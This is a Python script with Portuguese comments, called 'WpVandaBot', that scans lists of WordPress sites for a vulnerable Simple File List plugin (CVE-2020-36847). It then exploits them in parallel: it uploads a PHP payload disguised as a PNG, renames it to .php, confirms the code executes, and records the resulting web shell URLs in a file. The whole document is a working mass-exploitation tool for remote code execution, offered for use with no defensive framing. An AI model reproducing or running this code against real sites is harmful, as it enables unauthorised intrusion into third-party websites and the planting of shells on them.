import requests
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from colorama import Fore, init

# Inicialização do colorama e configuração
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

# Nome do bot e configurações
BOT_NAME = "WpVandaBot"
HEADERS = {'User-Agent': 'Mozilla/5.0'}
VULN_VERSION = "4.2.2"
PHP_PAYLOAD = "<?php echo 'Vuln!!!'; ?>"
UPLOAD_PATH = "wp-content/plugins/simple-file-list/ee-upload-engine.php"
RENAME_PATH = "wp-content/plugins/simple-file-list/ee-file-engine.php"
UPLOAD_FOLDER = "wp-content/uploads/simple-file-list/"

# Normaliza a URL
def filter_url(site):
    site = site.strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site
    if not site.endswith('/'):
        site += '/'
    return site

# Scanner do plugin
def check_plugin(site):
    site = filter_url(site)
    readme_url = urljoin(site, "wp-content/plugins/simple-file-list/readme.txt")
    try:
        response = requests.get(readme_url, headers=HEADERS, timeout=10, verify=False)
        if response.status_code == 200:
            if "Version:" in response.text:
                for line in response.text.splitlines():
                    if "Version:" in line:
                        version = line.split(":")[1].strip()
                        print(Fore.YELLOW + f"[{BOT_NAME}] [+] {site} - Plugin encontrado: versão {version}")
                        if version <= VULN_VERSION:
                            print(Fore.RED + f"[{BOT_NAME}] [!!!] {site} - POTENCIALMENTE VULNERÁVEL")
                            return True
                        else:
                            print(Fore.GREEN + f"[{BOT_NAME}] [OK] {site} - Versão segura")
                            return False
            else:
                print(Fore.YELLOW + f"[{BOT_NAME}] [?] {site} - Plugin encontrado, versão não identificada")
                return False
        elif response.status_code == 403:
            print(Fore.CYAN + f"[{BOT_NAME}] [?] {site} - Acesso negado ao readme.txt")
        else:
            print(Fore.WHITE + f"[{BOT_NAME}] [-] {site} - Plugin não encontrado")
        return False
    except Exception as e:
        print(Fore.RED + f"[{BOT_NAME}] [Erro] {site} - {str(e)}")
        return False

# Upload do payload
def upload_payload(base):
    upload_url = urljoin(base, UPLOAD_PATH)
    try:
        files = {'file': ('pwn.png', PHP_PAYLOAD, 'image/png')}
        r = requests.post(upload_url, files=files, headers=HEADERS, timeout=10, verify=False)
        r.raise_for_status()
        result = r.json()
        return result.get('file')
    except Exception:
        return None

# Renomear payload para .php
def rename_payload(base, filename):
    rename_url = urljoin(base, RENAME_PATH)
    try:
        new_name = filename[:-4] + '.php'
        data = {'oldFile': filename, 'newFile': new_name}
        r = requests.post(rename_url, data=data, headers=HEADERS, timeout=10, verify=False)
        r.raise_for_status()
        result = r.json()
        return result.get('newFile')
    except Exception:
        return None

# Executa exploit
def exploit(site):
    base = filter_url(site)
    try:
        filename = upload_payload(base)
        if not filename:
            print(Fore.RED + f"[{BOT_NAME}] [Falha no upload] - {site}")
            return

        newfile = rename_payload(base, filename)
        if not newfile:
            print(Fore.RED + f"[{BOT_NAME}] [Falha na renomeação] - {site}")
            return

        shell_url = urljoin(base, UPLOAD_FOLDER + newfile)
        r = requests.get(shell_url, headers=HEADERS, timeout=10, verify=False)
        if r.status_code == 200 and "Vuln!!!" in r.text:
            print(Fore.GREEN + f"[{BOT_NAME}] [Exploitado com sucesso] - {shell_url}")
            with open("shells_found.txt", "a") as f:
                f.write(shell_url + "\n")
        else:
            print(Fore.RED + f"[{BOT_NAME}] [Falha na execução] - {site}")
    except Exception:
        print(Fore.RED + f"[{BOT_NAME}] [Erro] - {site}")

# Lê lista de sites
def read_sites(filename):
    if not os.path.isfile(filename):
        print(f"Arquivo {filename} não encontrado.")
        sys.exit(1)
    with open(filename) as f:
        sites = [line.strip() for line in f if line.strip()]
    return sites

# Executa scanner
def run_scan(sites):
    print(f"\n[{BOT_NAME}] Iniciando scanner para CVE-2020-36847...\n")
    for site in sites:
        check_plugin(site)

# Executa exploits em paralelo
def run_exploit(sites):
    print(f"\n[{BOT_NAME}] Iniciando exploit...\n")
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(exploit, site) for site in sites]
        for _ in as_completed(futures):
            pass

# Banner com nome do bot
def banner():
    print(Fore.CYAN + f"""
  __        __   _ _______           _             
  \ \      / /__| |__   __|__  _ __ | | _____ _ __ 
   \ \ /\ / / _ \ '__| |/ _ \| '_ \| |/ / _ \ '__|
    \ V  V /  __/ |    | (_) | | | |   <  __/ |   
     \_/\_/ \___|_|     \___/|_| |_|_|\_\___|_| v1.0
                [ {BOT_NAME} ]
    """)
    print("1) Scan (verificar vulnerabilidade)")
    print("2) Exploit (tentativa de RCE)")
    print("0) Sair")

# Menu principal
def main():
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} list.txt")
        sys.exit(1)

    sites = read_sites(sys.argv[1])

    while True:
        banner()
        choice = input("\nEscolha uma opção: ").strip()
        if choice == '1':
            run_scan(sites)
        elif choice == '2':
            run_exploit(sites)
        elif choice == '0':
            print(f"[{BOT_NAME}] Saindo...")
            sys.exit(0)
        else:
            print(f"[{BOT_NAME}] Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()
